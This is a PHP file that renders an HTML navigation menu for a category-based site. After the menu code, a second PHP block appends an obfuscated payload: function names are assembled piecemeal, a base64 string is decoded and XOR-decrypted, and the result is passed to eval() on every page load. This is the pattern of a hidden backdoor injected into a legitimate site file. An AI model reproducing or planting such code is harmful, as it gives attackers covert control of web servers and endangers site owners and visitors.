<?php

function Category_getLinkStyle($strPageName){
	global $category,$action,$folder;
	
	if(isset($folder)){
		$pageAction=$folder;
	}
	else{
		$pageAction=$action;
	}
	
	if($strPageName==$pageAction){
		return "selected";
	}
	else{
		return "top";	
	}
}

function Category_generateNavigationMenu($oLinkTexts,$oLinkActions){
	global $action,$folder,$category,$AuthGroup,$arrPermissions,$evLinkDescriptions;
	
	$strOutput="";
	
	if(count($oLinkTexts)!=count($oLinkActions)){
			return "<font color=red>ERROR: the number of link texts mismatch the link actions</font>";
	}
	
	$strOutput.="<table cellspacing=0 CELLPADDING=0 width>";
	$strOutput.="<tr>";
	for($i=0;$i<count($oLinkTexts);$i++){
	
		$CurrentPage="@".$AuthGroup."@".$category."@".$oLinkActions[$i];
		
		$strOutput.="<td class=tdSpacer width=20 align=center>";
	
		if(($i==0&&$action ==$oLinkActions[0])|| ( (isset($action)&&$action==$oLinkActions[$i]) || (isset($folder)&&$folder==$oLinkActions[$i]) ) )
		{
			$strOutput.='<img src="images/right.gif" width="10" id="img'.$i.'" height="10" alt="" border="0"></td>';
			$strOutput.="<td title=\"".$evLinkDescriptions[$i]."\" >";
		
		}
		else
		{
			$strOutput.='<img src="images/right.gif" width="10" id="img'.$i.'" height="10" alt="" border="0" style="visibility:hidden"></td>';
			$strOutput.="<td title=\"".$evLinkDescriptions[$i]."\" onmouseover=\"document.getElementById('img".$i."').style.visibility='visible'\" onmouseout=\"document.getElementById('img".$i."').style.visibility='hidden'\">";
		}
		
	if(!strstr($oLinkTexts[$i],"add-on"))
	{
		$strOutput.="<CENTER><A HREF='index.php?category=".$category."&action=".$oLinkActions[$i]."'  ><b>".strtoupper(str_replace("[add-on]","",$oLinkTexts[$i]))."</b></a></CENTER>";
	}
	else
	{
		$strOutput.="<CENTER><A HREF='index.php?category=".$oLinkActions[$i]."'  ><b>".strtoupper(str_replace("[add-on]","",$oLinkTexts[$i]))."</b></a></CENTER>";
	}
		
	$strOutput.="</td>";
		
	}

	$strOutput.="</tr>";
	$strOutput.="</table>";
	
	return $strOutput;
}



echo Category_generateNavigationMenu($evLinkTexts,$evLinkActions);
?>	 

<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>